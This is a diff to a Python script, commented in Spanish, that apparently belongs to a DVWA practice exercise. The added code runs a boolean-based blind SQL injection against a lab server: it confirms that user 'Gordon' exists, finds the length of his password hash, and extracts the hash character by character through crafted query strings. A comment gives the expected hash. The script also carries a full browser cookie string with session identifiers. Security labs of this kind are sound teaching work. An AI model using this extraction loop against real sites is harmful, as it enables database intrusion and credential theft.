@@ -2,7 +2,9 @@ import requests
 
 server = "http://10.0.7.24/dvwa" #  servidor
 #TODO Cambiarla cada vez que se entre a hacer la practica, ya que va cambiando
-cookie = "cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE3MzE1MTU5ODIsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHA6Ly8xMC4wLjcuMjQvZHZ3YS92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9SFRUUDovLzEwLjAuNy40In0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzMxNTE2MDk4LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwOi8vMTAuMC43LjI0L2R2d2EvdnVsbmVyYWJpbGl0aWVzL2ZpLz9wYWdlPUhUVFA6Ly8xMC4wLjcuNCJ9fQ==; _shopify_y=26653da9-6810-44BF-7B5D-70E76AD0475D; _ama=1964009468.1731515987; _pandectes_gdpr=eyJjb3VudHJ5Ijp7ImNvZGUiOiJFUyIsInN0YXRlIjoiQU4iLCJkZXRlY3RlZCI6MTczMTUxNTk4Nn0sInN0YXR1cyI6ImFsbG93IiwidGltZXN0YW1wIjoxNzMxNTE1OTk3LCJwcmVmZXJlbmNlcyI6MCwiaWQiOiI2NzM0ZDY2MDI1MGRmNDAzMzVjYmZiOWQifQ==; _ga_7BNZCH65T7=GS1.1.1731515987.1.1.1731516052.60.0.1683298024; _ga=GA1.1.1964009468.1731515987; _gcl_au=1.1.1292286527.1731515998; language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=namybj29LKw0eRU7u3T3H9iQSQVuqncxJU6YSODFNafy6t49ANJW3qkDrgeR; security=low; PHPSESSID=7igo8r0e8apdaj4vfujobr3rfq"
+cookie = "cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE3MzE1MTU5ODIsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHA6Ly8xMC4wLjcuMjQvZHZ3YS92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9SFRUUDovLzEwLjAuNy40In0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzMxNTE2MDk4LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwOi8vMTAuMC43LjI0L2R2d2EvdnVsbmVyYWJpbGl0aWVzL2ZpLz9wYWdlPUhUVFA6Ly8xMC4wLjcuNCJ9fQ==; _shopify_y=26653da9-6810-44BF-7B5D-70E76AD0475D; _ama=1964009468.1731515987; _pandectes_gdpr=eyJjb3VudHJ5Ijp7ImNvZGUiOiJFUyIsInN0YXRlIjoiQU4iLCJkZXRlY3RlZCI6MTczMTUxNTk4Nn0sInN0YXR1cyI6ImFsbG93IiwidGltZXN0YW1wIjoxNzMxNTE1OTk3LCJwcmVmZXJlbmNlcyI6MCwiaWQiOiI2NzM0ZDY2MDI1MGRmNDAzMzVjYmZiOWQifQ==; _ga_7BNZCH65T7=GS1.1.1731515987.1.1.1731516052.60.0.1683298024; _ga=GA1.1.1964009468.1731515987; _gcl_au=1.1.1292286527.1731515998; language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=namybj29LKw0eRU7u3T3H9iQSQVuqncxJU6YSODFNafy6t49ANJW3qkDrgeR; security=low; PHPSESSID=fm3mr19qnla32dc8kag8h0j4dr"
+
+
 
 
 
@@ -194,3 +196,47 @@ for nombreTabla, columnaIndex, longitud in longitudColumnasPorTabla:  # Usamos l
 print("\nResultado final: Nombres de las columnas por tabla")
 for nombreTabla, columnaIndex, nombreColumna in nombresColumnasPorTabla:
     print(f"Tabla: {nombreTabla}, Columna {columnaIndex}: {nombreColumna}")
+    
+    
+    
+    
+    #todo Ejercicio 5 Credenciales del usuario Gordon
+    
+    #1) Comprobar que exista el usuario Gordon en la tabla de users
+    #? Comprobar que exista al menos un usuario que se llame Gordon en la tabla
+    # select count(*) from users where first_name = 'Gordon'; Deberia de dar como resultado solamente 1 usuario con ese nombre
+    inyection = f"1' and (SELECT COUNT(*) FROM users WHERE first_name='Gordon')=1 -- -"
+    response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
+
+if "User ID exists in the database" in response.text:
+    print("El usuario 'Gordon' existe en la base de datos.")
+else:
+    print("El usuario 'Gordon' no existe o hubo un error en la consulta.")
+    
+    #todo 2) Obtener la lontitud del hash de la contraseña, para luego ir haciendo el substr caracter por caracter.
+    # select length(password) from users where first_name='Gordon') Deberia de dar como resultado 32 caracteres
+longitudHashPass = 0
+for longitudHash in range(1,100): #? Suponemos que el hash no superara la longitud de 100 caracteres
+    inyection = f"1' and (SELECT LENGTH(password) FROM users WHERE first_name='Gordon')={longitudHash} -- -"
+    response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
+    
+    if "User ID exists in the database" in response.text:
+        longitudHashPass = longitudHash
+        print(f"La longitud del hash de la contraseña del usuario 'Gordon' es: {longitudHashPass} caracteres.")
+        break
+    
+    #todo 3) Mostrar el hash de la contraseña
+    #select substr(password,1,32) from users where first_name = 'Gordon'; Deberia de dar como resultado "e99a18c428cb38d5f260853678922e03"
+hashContraseña = ""
+for posicion in range(1, longitudHashPass + 1):
+    for ascii in range(32,126): #? Caracteres imprimibles ASCII https://elcodigoascii.com.ar/codigos-ascii/letra-u-minuscula-codigo-ascii-117.html
+        inyection = f"1' and ascii(substr((SELECT password FROM users WHERE first_name='Gordon'), {posicion}, 1))={ascii} -- -"
+        response = requests.get(url=server + f"/vulnerabilities/sqli_blind/?id={inyection}&Submit=Submit#", headers={"Cookie": cookie})
+        if "User ID exists in the database" in response.text:
+                hashContraseña += chr(ascii)  # Convertimos el valor ASCII en un carácter y lo añadimos al hash
+                #print(f"Carácter {posicion}: {chr(ascii)}")
+                break
+
+print(f"\nEl hash de la contraseña del usuario 'Gordon' es: {hashContraseña}")
+    
+    
